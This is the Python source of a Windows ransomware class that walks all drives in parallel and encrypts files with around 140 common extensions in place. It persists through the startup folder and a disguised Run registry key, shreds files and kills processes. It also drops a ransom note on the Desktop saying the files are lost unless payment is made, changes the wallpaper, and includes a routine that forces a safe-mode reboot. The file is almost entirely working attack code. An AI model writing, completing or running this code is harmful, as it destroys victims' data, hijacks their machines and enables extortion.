import os
import sys
import string
import random
import signal
import psutil
import base64
import threading
import pyautogui
import subprocess
from winreg import *
from ctypes import windll
from shutil import copyfile
from Cryptodome import Random
from Cryptodome.PublicKey import RSA
from cryptography.fernet import Fernet
from PIL import Image, ImageFont, ImageDraw

class ransomware:
    current_path = os.path.realpath(sys.argv[0])
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    note_path = os.path.join(desktop_path, "Note.txt")
    
    root_files = ["C:\\", "D:\\", "E:\\", "F:\\", "H:\\", "I:\\", "J:\\", "K:\\", "L:\\", "M:\\", "N:\\", "O:\\", "P:\\", "Q:\\", "R:\\", "S:\\", "T:\\", "U:\\", "V:\\", "W:\\", "X:\\", "Y:\\", "Z:\\"]
    
    #Extensions
    file_extensions = ['.3ds', '.7z', '.aac', '.accdb', '.accdc', '.accde', '.accdr', '.accdt', '.accdw', '.adts', '.asp', '.aspx', '.avi', '.back', '.bak', '.bmp', '.c', '.cda', '.cfg', '.class', '.conf', '.cpp', '.cs', '.csv', '.db', '.dbf', '.disk', '.djvu', '.doc', '.docm', '.docx', '.dot', '.dotx', '.dwg', '.eml', '.eps', '.fdb', '.gif', '.gz', '.h', '.hdd', '.htm', 
        '.iso', '.jar', '.java', '.jpeg', '.jpg', '.js', '.kdbx', '.laccdb', '.m4a', '.mail', '.mdb', '.mp3', '.mp4', '.mpeg', '.mpg', '.msg', '.nrg', '.ora', '.ost', '.ova', '.ovf', '.pdf', '.php', '.pmf', '.png', '.pot', '.potm', '.potx', '.pps', '.ppsm', '.ppsx', '.ppt', '.pptm', '.pptx', '.psd', '.pst', '.py', '.pyc', '.rar', '.rtf', '.sldm', '.sldx', '.sln', '.sql', '.sqlite', '.sqlite3', '.sqlitedb', '.swf', '.tar', '.tif', '.tiff', '.txt', '.vbox', '.vbs', '.vcb', '.vdi', '.vfd', '.vmc', '.vmdk', '.vmsd', '.vmx', '.vob', '.vsdm', '.vsdx', '.vss', '.vssm', '.vstx', '.vsv', '.wav', '.wks', '.wma', '.wmd', '.wmv', '.work', '.wp5', '.wpd', '.xla', '.xlam', '.xlm', '.xls', '.xlsm', '.xlsx', '.xlt', '.xltm', '.xltx', '.xvd', '.zip']
    
    def __init__(self):
        self.key = None
        self.crypter = None
        self.private_key = None
        self.public_key = None
        
        self.temp_folder = os.getenv("TEMP")
        self.app_data = os.getenv("APPDATA")
        self.startup_path = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
        self.register_name = "LastBatterySqm"
        
        self.extensions = self.file_extensions.copy()
        temp_list = []
        
        for file in self.root_files:
            if os.path.exists(file):
                temp_list.append(file)
        
        self.root_files = temp_list.copy()

    def generate_keys(self):
        random = Random.new().read
        key = RSA.generate(4096, random)
        
        private = key.exportKey()
        public = key.public_key().exportKey()
        
        self.private_key = private
        self.public_key = public
    
    def generate_fernet(self):
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)

    #Encrypt file (TODO - RIPlace)
    def encrypt_file(self, path):
        try:
            with open(path, 'rb') as file:
                data = file.read()
                encrypted_data = self.crypter.encrypt(data)
            
            with open(path, 'wb') as file:
                file.write(encrypted_data)
        except Exception:
            pass
    
    def encrypt_directory(self, directory_path):
        try:
            for root, dir, files in os.walk(directory_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    tmp, extension = os.path.splitext(file_path)                 
                    
                    if extension.lower() in self.extensions:
                        self.encrypt_file(file_path)
        except Exception:
            pass
    
    def encrypt_system(self):
        try:
            threads = []
            for file in self.root_files:
                thread = threading.Thread(target=self.encrypt_directory, args=(file, ))
                thread.daemon = True
                threads.append(thread)

            for t in threads:
                t.start()
            
            for t in threads:
                t.join()
        except Exception:
            pass

    def delete_keys(self):
        del self.key
        del self.crypter
        del self.private_key
        del self.public_key

    def shred(self, path, times_to_repeat=5):
        try:
            for i in range(times_to_repeat):
                data = base64.b64encode(self.generate_random_string(400).encode())
                modified_data = base64.b85encode(data)
                file = open(path, 'w')
                
                file.write(modified_data.decode())                                            
                file.close()            
            
            name = self.generate_random_string(30)
            os.rename(path, name)
            os.unlink(name)
        except Exception:
            pass

    def write_to_registry(self):
        try:
            self.copy_to_startup()
            reg_key = OpenKey(HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
            
            SetValueEx(reg_key, self.register_name, 0, REG_SZ, os.path.join(self.startup_path, os.path.basename(self.current_path)))
            CloseKey(reg_key)
        except Exception:
            pass

        #Already executed (TODO)
    
    def remove_from_registry(self):
        try:            
            reg = OpenKey(HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
            
            DeleteValue(reg, self.register_name)
            CloseKey(reg)
        except Exception:
            pass

    def already_executed(self):
        try:
            for dirpath, dirnames, filenames in os.walk(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"):
                if os.path.basename(self.current_path) in filenames:
                    return True
        
            return False
        except Exception:
            pass

    def kill_process(self, names):
        try:
            for name in names:
                for process in psutil.process_iter():
                    if str(name) in process.name():
                        process_pid = process.pid                     
                        os.kill(int(process_pid), signal.SIGTERM)

            return True
        except Exception:
            return False

    def copy_to_startup(self):
        try:
            if not os.getcwd() == self.startup_path:
                copyfile(self.current_path, os.path.join(self.startup_path, os.path.basename(self.current_path)))
        except Exception:
            pass

    def text_to_image(self, text):
        try:            
            font = ImageFont.truetype("arial", 80)
            width, height = pyautogui.size()

            image = Image.new('L', (width, height), color='black')
            drawn_image = ImageDraw.Draw(image)
            drawn_image.text((width / 4, height / 2), text, fill=255, font=font)
            
            return image
        except Exception:
            pass
    
    def run_powershell_command(self, command):
        try:
            return str(subprocess.run(["powershell", "-Command", command], capture_output=True))
        except Exception:
            pass
    
    #TODO
    def reboot_into_safe_mode(self):
        try:            
            #Hijack using MBR            
            os.system(r'cmd /k "{}"'.format("bcdedit /set {default} safeboot minimal"))
            os.system("shutdown /r /t 0")
        except Exception:
            return False

    def create_note(self):
        try:
            with open(self.note_path, 'w') as file:
                file.write("If you see this text, then all of your files including your Photos, Documents, Videos... have been encrypted.\nThey are NO LONGER accessible.\nPlease save yourself a couple of hours, by not searching for a decryption service, because that won't work.\n\nHow to get my files back?\nTo get your files back you will need to donate at least 50$ to charity.\nWe will detect the donation and decrypt all of your files.\n\nPlease do not modify the encrypted files or we might not be able to restore them.")
            
            return True
        except Exception:
            return False

    def add_notes(self):
        try:
            result = self.kill_process(["wallpaper32.exe", "wallpaper64.exe"])
            if result == True:
                background_image_path = os.path.join(self.temp_folder, "WindowsFirewallIcon.png")
                note_result = self.create_note()

                if note_result == True:
                    image = self.text_to_image("Find Note.txt on the Desktop")
                    image.save(background_image_path)
                    
                    windll.user32.SystemParametersInfoW(20, 0,  background_image_path, 0)                
        except Exception:
            pass

    def generate_random_string(self, length):
        try:
            return "".join(random.choice(string.ascii_uppercase + string.digits) for i in range(length))
        except Exception:
            pass